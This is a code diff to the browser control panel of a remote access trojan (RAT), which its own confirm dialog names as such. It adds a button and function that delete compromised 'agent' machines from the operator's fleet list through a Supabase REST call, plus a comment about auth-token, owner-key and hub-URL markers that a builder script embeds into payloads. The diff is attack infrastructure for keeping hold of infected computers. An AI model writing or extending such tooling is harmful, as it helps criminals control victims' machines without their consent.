@@ -468,8 +468,10 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
           +'<td>'+esc(a.user)+'</td>'
           +'<td>'+(a.port||'—')+'</td>'
           +'<td style="color:var(--text-muted)">'+(esc((a.id||'').slice(0,8)))+'</td>'
-          +'<td><button class="btn btn-primary btn-sm" type="button" data-open="'+esc(a.id)+'">PANEL</button></td>'
-          +'</tr>';
+          +'<td style="white-space:nowrap">'
+          +'<button class="btn btn-primary btn-sm" type="button" data-open="'+esc(a.id)+'">PANEL</button> '
+          +'<button class="btn btn-danger btn-sm" type="button" data-del="'+esc(a.id)+'">DEL</button>'
+          +'</td></tr>';
       }).join('')
       +'</tbody></table>';
     wrap.querySelectorAll('tr[data-id]').forEach(tr=>{
@@ -478,8 +480,20 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
     wrap.querySelectorAll('[data-open]').forEach(b=>{
       b.addEventListener('click',e=>{ e.stopPropagation(); selectAgent(b.getAttribute('data-open')); });
     });
+    wrap.querySelectorAll('[data-del]').forEach(b=>{
+      b.addEventListener('click',e=>{ e.stopPropagation(); removeAgent(b.getAttribute('data-del')); });
+    });
   }
 
+  async function removeAgent(id){
+    if(!id) return;
+    if(!confirm('Remove machine '+id+' from fleet? (does not uninstall RAT)')) return;
+    try{
+      const r=await sbRest('/rest/v1/agents?id=eq.'+encodeURIComponent(id),{method:'DELETE',headers:{'Prefer':'return=minimal'}});
+      if(r.status>=200 && r.status<300){ toast('REMOVED','success'); if(SELECTED&&SELECTED.id===id){ SELECTED=null; document.getElementById('panel-frame').src='about:blank'; } refresh(); }
+      else toast('DELETE FAIL '+r.status,'error');
+    }catch(e){ toast(String(e),'error'); }
+  }
   async function refresh(){
     if(!SB_URL || !SB_ANON){
       document.getElementById('machine-wrap').innerHTML='<div class="empty-state">config.js manquant</div>';
@@ -564,6 +578,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
         buf.set(enc(value), i);
         return 1;
       }
+      // exact markers produced by: python tttttt.py --embed --template
       const AUTH='NEX_AUTH_TOKEN_XXXXXXXXXXXXXXXXX'; //32
       const OWNER='NEX_OWNER_KEY_XXXXXXXXXXXXXXXXXX'; //32
       const HUB='NEX_HUB_URL_'+'X'.repeat(96-'NEX_HUB_URL_'.length); //96
